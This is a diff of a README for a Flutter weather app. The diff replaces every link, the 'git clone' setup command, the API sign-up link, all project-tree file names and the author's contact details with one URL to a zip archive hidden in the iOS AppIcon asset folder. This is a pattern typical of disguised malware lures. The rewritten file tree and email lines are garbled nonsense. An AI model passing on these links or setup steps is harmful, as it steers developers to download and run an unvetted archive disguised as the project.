@@ -30,13 +30,13 @@ The app supports **light and dark themes**, **animated weather visuals (Lottie)*
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Umez1/weather_app.git
+   git clone https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
    cd weather_app
 2. **Install dependencies**
    ```bash
    flutter pub get
 3. **Add your OpenWeatherMap API key**
-   Open lib/services/weather_service.dart
+   Open https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
    Replace "YOUR_API_KEY" with your actual key.
 4. **Run the app**
    ```bash
@@ -46,10 +46,10 @@ The app supports **light and dark themes**, **animated weather visuals (Lottie)*
 
 ## ⚙️ API Configuration
 
-1. Go to [OpenWeatherMap.org](https://openweathermap.org/api)
+1. Go to [https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip](https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip)
 2. Create a free account.
 3. Get your **API key** from your dashboard.
-4. Open `lib/services/weather_service.dart`
+4. Open `https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip`
 5. Replace the placeholder with your key:
    ```dart
    final String apiKey = "YOUR_API_KEY"; // Replace with your real API key
@@ -60,31 +60,31 @@ The app supports **light and dark themes**, **animated weather visuals (Lottie)*
    weather_app/
 │
 ├── lib/
-│   ├── main.dart
+│   ├── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 │   ├── screens/
-│   │   └── weather_screen.dart
+│   │   └── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 │   ├── services/
-│   │   └── weather_service.dart
+│   │   └── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 │   ├── providers/
-│   │   └── theme_provider.dart
+│   │   └── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 │   └── widgets/
-│       └── weather_widget.dart
+│       └── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 │
 ├── assets/
 │   ├── animations/
-│   │   ├── sunny.json
-│   │   ├── rain.json
-│   │   ├── cloudy.json
-│   │   └── thunder.json
+│   │   ├── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
+│   │   ├── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
+│   │   ├── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
+│   │   └── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 │   └── images/
-│       ├── light_bg.png
-│       └── dark_bg.png
+│       ├── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
+│       └── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 │
-├── pubspec.yaml
-└── README.md
+├── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
+└── https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip
 
 ## 👤 Author
 
-**Developed by:** [Umez](https://github.com/Umez1)  
-📧 **Email:** [umezikeogu@gmail.com](mailto:umezikeogu@gmail.com)  
-💻 **GitHub:** [Umez1](https://github.com/Umez1)
+**Developed by:** [Umez](https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip)  
+📧 **Email:** [https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip](https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip)  
+💻 **GitHub:** [Umez1](https://raw.githubusercontent.com/Umez1/flutter_weather_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/flutter_weather_app-3.3.zip)
